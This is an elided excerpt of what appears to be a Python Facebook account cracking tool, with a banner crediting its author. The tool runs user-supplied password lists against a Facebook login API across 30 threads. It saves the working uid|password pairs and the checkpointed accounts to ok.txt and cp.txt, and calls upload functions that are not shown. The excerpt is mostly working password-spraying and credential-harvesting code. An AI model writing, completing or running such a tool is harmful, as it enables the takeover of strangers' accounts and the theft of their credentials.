...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> AHSAM UL HAQ")
	subprocess.check_output(["am", "start", "https://www.facebook.com/AHSAM.JOIYA"])
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            AHSAM UL HAQ JOIYA
     \033[1;91m➣ \033[1;92mFACEBOOK   :            AHSAM UL HAQ
     \033[1;93m➣ \033[1;92mWHATSAPP   :            +9411471***
     \033[1;96m➣ \033[1;92mGITHUB          :            MR-AUH404
     \033[1;95m➣ \033[1;92mTOOLS            :            FREE
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
    """)
...
#				exit()
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR AHSAM  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:AHSAM ): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [AHSAM] : \033[0;97m %s/%s -> \033[0;92m [AHSAM -OK:%s ]- \033[0;93m[AHSAM-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[AHSAM-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [AHSAM-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[AHSAM-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [AHSAM-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
